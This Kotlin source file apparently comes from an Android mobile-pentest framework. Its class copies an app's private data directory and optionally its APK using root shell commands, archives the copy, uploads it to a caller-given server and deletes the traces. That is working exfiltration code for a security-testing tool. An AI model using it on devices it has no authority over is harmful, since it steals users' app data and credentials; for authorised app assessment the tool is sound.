package io.hakaisecurity.beerusframework.core.functions.sandboxExfiltration

import android.util.Log
import io.hakaisecurity.beerusframework.core.models.Application
import io.hakaisecurity.beerusframework.core.utils.CommandUtils.Companion.runSuCommand
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.Response
import java.io.File
import java.io.IOException

class SandboxExfiltration {
    private val client = OkHttpClient()

    private fun sendFile(fileName: String, server:String, onComplete: (String) -> Unit) {
        val sourceFile = File(fileName)
        if (!sourceFile.exists()) {
            onComplete("Compressed file not found: $fileName")
        }

        val fileBody = sourceFile.asRequestBody("application/octet-stream".toMediaTypeOrNull())
        var body = MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("file", sourceFile.name, fileBody).build()
        val request = Request.Builder().url(server).post(body).build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                onComplete("ERROR: Failed to send the file")
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    onComplete("SUCCESS: File sent successfully")
                } else {
                    onComplete("ERROR: Failed to send the file")
                }
            }
        })

    }

    fun prepareFileToSend(destinationPath: String, server: String, isUSB: Boolean, onComplete: (String) -> Unit) {
        runSuCommand("tar -czf $destinationPath.tar.gz $destinationPath/*") { tarResult ->
            if (tarResult.isBlank()) {
                onComplete("fail")
            } else {
                runSuCommand("chmod 655 $destinationPath.tar.gz && rm -rf $destinationPath") {
                    if (!isUSB) {
                        sendFile(fileName="$destinationPath.tar.gz", server=server) { R ->
                            runSuCommand("rm -rf $destinationPath") {}
                            runSuCommand("rm -rf $destinationPath.tar.gz") {}
                            onComplete("success")
                        }
                    } else {
                        onComplete("success")
                    }
                }
            }
        }
    }

    fun exfiltrateFile(app: Application, server:String, addBinary: Boolean, isUSB: Boolean, onComplete: (String) -> Unit) {
        val sourceFile = File(app.artifactPath).parent

        val destinationPath = "/data/local/tmp/${app.identifier}"
        val dataPath = "/data/data/${app.identifier}"

        runSuCommand("mkdir $destinationPath") {
            runSuCommand("cp -r $dataPath $destinationPath") {
                if (addBinary) {
                    runSuCommand("cp -r $sourceFile/*.apk $destinationPath") {
                        prepareFileToSend(destinationPath, server, isUSB) { status ->
                            onComplete(status)
                        }
                    }
                } else {
                    prepareFileToSend(destinationPath, server, isUSB) { status ->
                        onComplete(status)
                    }
                }
            }
        }
    }
}